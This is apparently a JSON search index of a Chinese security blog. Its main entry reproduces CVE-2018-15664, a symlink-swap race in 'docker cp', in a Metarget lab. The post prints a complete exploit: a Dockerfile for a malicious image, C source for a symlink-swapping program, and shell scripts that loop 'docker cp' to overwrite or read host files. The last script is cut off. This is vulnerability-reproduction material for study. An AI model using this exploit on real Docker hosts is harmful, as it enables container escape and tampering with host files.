[{"categories":["云原生安全"],"content":"第一篇文章","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"CVE-2018-15664：符号链接替换漏洞 前置知识 docker cp 用于容器和宿主机文件系统之间进行文件或目录复制 //将主机/www/xxx文件拷贝到容器685c2a289adf的/www目录下(若是/www,则是拷贝到容器根目录下，重命名为www) docker cp /www/xxx 685c2a289adf:/www/ //将容器685c2a289adf下的/www目录拷贝到主机的/tmp目录中 docker cp 685c2a289adf:/www /tmp/ ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"漏洞介绍 存在:18.06.1-ce-rc2版本前中的Docker中 docker cp 命令 对应的后端API存在基于条件竞争的符号链接替换漏洞，能够导致目录穿越。 可以利用此漏洞逃逸出容器读取或篡改host其他任意容器内的文件。 其实是一个TOCTOU（time-of-check to time-of-use），使用FollowSymlinkInScope函数时触发文件系统的条件竞争缺陷导致，属于竞态条件漏洞 竞态条件漏洞，即程序对某对象进行安全检查和使用该对象的步骤之间存在间隙，攻击者可以先构造并放置一个能够通过安全检查的合法对象，顺利通过目标程序的安全检查流程，然后再执行之前立即使用恶意对象替换之间的合法对象。 FollowSymlinkInScope作用:解析容器运行中运行进程的文件路径。攻击者就利用解析校验完成之后和操作执行间的空隙，修改cp文件，改为一个符号链接对应的目标文件 Docker daemon收到docker cp的请求，会对复制的路径进行检查，如果路径中有容器内的符号链接，就先在容器内部将其解析成路径字符串，留待后用 真实过程：Docker daemon检查复制路径时，攻击者放置正常的非符号连接的常规文件或目录，在检查结束之后、docker daemon使用路径前，将其替换成符号连接 利用条件： hacker需要有docker cp的使用权限和目标容器的访问权限 解析文件，到完成cp的动作，是毫秒级，攻击难度较大 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:1","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"搭建环境 使用Metarget提供的靶场环境 git clone https://github.com/Metarget/metarget.git cd metarget ./metarget cnv install cve-2018-15664 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:2","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"poc: https://seclists.org/oss-sec/2019/q2/131 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:3","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"DockerFile 用来制作恶意镜像 构建漏洞利用程序symlink_swap并将其放在容器根目录下，并在根目录创建一个w00t_w00t_im_ a_flag文件，内容为FAlLED-INSIDE CONTAINER PATH 容器启动后执行(Entrypoint)即为/symlink_swap # Build the binary. #拉取suse linux的基础镜像 FROM opensuse/tumbleweed #安装gcc glibc-devel-static RUN zypper in -y gcc glibc-devel-static RUN mkdir /builddir #构建漏洞利用程序symlink_swap，并将其放在容器根目录下 COPY symlink_swap.c /builddir/symlink_swap.c RUN gcc -Wall -Werror -static -o /builddir/symlink_swap /builddir/symlink_swap.c # Set up our malicious rootfs. FROM opensuse/tumbleweed ARG SYMSWAP_TARGET=/w00t_w00t_im_a_flag ARG SYMSWAP_PATH=/totally_safe_path RUN echo \"FAILED -- INSIDE CONTAINER PATH\" \u003e\"$SYMSWAP_TARGET\" COPY --from=0 /builddir/symlink_swap /symlink_swap #容器启动后执行的程序（Etrypoint）即为/symlink_swap ENTRYPOINT [\"/symlink_swap\"] ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:4","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["云原生安全"],"content":"知识点： 多阶段构建 多个FROM指令不是为了生成多根的层关系，最后生成的镜像，仍以最后一条FROM为准，之前的被抛弃 每个FROM指令都是一个构建阶段，多条FROM就是多阶段构建。虽然之前的FROM会被抛弃，但是前置阶段的文件拷贝到后边的阶段中，这就是多阶段构建的最大意义。 这里做到的效果就是将编译环境和运行环境分离 构建阶段还可以进行命名，如: # syntax=docker/dockerfile:1 FROM golang:1.16 AS builder WORKDIR /go/src/github.com/alexellis/href-counter/ RUN go get -d -v golang.org/x/net/html COPY app.go ./ RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app . FROM alpine:latest RUN apk --no-cache add ca-certificates WORKDIR /root/ COPY --from=builder /go/src/github.com/alexellis/href-counter/app ./ CMD [\"./app\"] 默认情况下，阶段没有命名，可以通过整数来引用他们，整数从0开始。 这种情况下，即使dokcerfile中的指令后面重新排序，COPY也不会中断。 ARG vs ENV arg是在bulid的时候存在，可以在Dockerfile 中当作变量来使用(ARG专门为构建镜像而生) env是容器构建好之后的环境变量，不能在Dockerfile中当参数使用 Symlink_swap 容器内漏洞利用源代码 在容器内创建指向根目录”/“的符号链接，并不断的交换符号链接(由命令行参数传入，如”/totally_safe_path”）与一个正常目录(例如”/totally_safe_path-stashed”)的名字。这样一来，宿主机执行docker cp 时，首先检查到”/totally_safe_path\"是一个正常目录，但是后面执行复制操作时”/totally_safe_path\"却变成了一个符号链接，那么Docker将在宿主机解析这个符号链接 #define _GNU_SOURCE #include \u003cfcntl.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/syscall.h\u003e #include \u003cunistd.h\u003e #define usage() \\ do { printf(\"usage: symlink_swap \u003csymlink\u003e\\n\"); exit(1); } while(0) #define bail(msg) \\ do { perror(\"symlink_swap: \" msg); exit(1); } while (0) /* No glibc wrapper for this, so wrap it ourselves. */ #define RENAME_EXCHANGE (1 \u003c\u003c 1) int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags) { return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags); } /* usage: symlink_swap \u003csymlink\u003e */ int main(int argc, char **argv) { if (argc != 2) usage(); char *symlink_path = argv[1]; char *stash_path = NULL; if (asprintf(\u0026stash_path, \"%s-stashed\", symlink_path) \u003c 0) bail(\"create stash_path\"); /* Create a dummy file at symlink_path. */ struct stat sb = {0}; if (!lstat(symlink_path, \u0026sb)) { int err; if (sb.st_mode \u0026 S_IFDIR) err = rmdir(symlink_path); else err = unlink(symlink_path); if (err \u003c 0) bail(\"unlink symlink_path\"); } /* * Now create a symlink to \"/\" (which will resolve to the host's root if we * win the race) and a dummy directory at stash_path for us to swap with. * We use a directory to remove the possibility of ENOTDIR which reduces * the chance of us winning. */ if (symlink(\"/\", symlink_path) \u003c 0) bail(\"create symlink_path\"); if (mkdir(stash_path, 0755) \u003c 0) bail(\"mkdir stash_path\"); /* Now we do a RENAME_EXCHANGE forever. */ for (;;) { int err = renameat2(AT_FDCWD, symlink_path, AT_FDCWD, stash_path, RENAME_EXCHANGE); if (err \u003c 0) perror(\"symlink_swap: rename exchange failed\"); } return 0; } 属于竞态条件漏洞，不是每次都能复现，为了增大触发几率，需要在宿主机不断执行dokcer cp命令run_read.sh和run_write.sh模拟受害者在宿主机不断执行docker cp 命令 run_write.sh 宿主机cp到容器内的场景，触发漏洞，指定的宿主机文件将覆盖容器内恶意符号链接 #!/bin/bash SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"FAILED -- HOST FILE UNCHANGED\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 0444 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") echo \"SUCCESS -- HOST FILE CHANGED\" | tee localpath # Now continually try to copy the files. while true do docker cp localpath \"${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET\" done run_read.sh 模拟docker cp将容器内文件复制到宿主机上场景，一旦触发，容器内恶意符号链接在宿主机文件系统解析后执行的文件将被复制到受害者设定的宿主机目录下 #!/bin/bash SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"SUCCESS -- COPIED FROM THE HOST\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 000 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") # Now continually try to copy the files. idx=0 while true do mkdir \"ex${idx}\" ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:5","tags":["docker漏洞"],"title":"CVE-2018-15664漏洞复现","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":[],"content":" CTF Web、Misc 信息安全爱好者 目前研究方向web安全、云原生安全 除了电脑，代码，网络之外的生活，也是要认真对待。 一直在路上 ","date":"2022-01-09","objectID":"/about/:0:0","tags":[],"title":"About","uri":"/about/"},{"categories":[],"content":" AmiaaaZ https://amiaaaz.github.io/ D3n13d https://d3n13d.github.io/ ","date":"2022-01-09","objectID":"/friends/:0:0","tags":[],"title":"Friends","uri":"/friends/"}]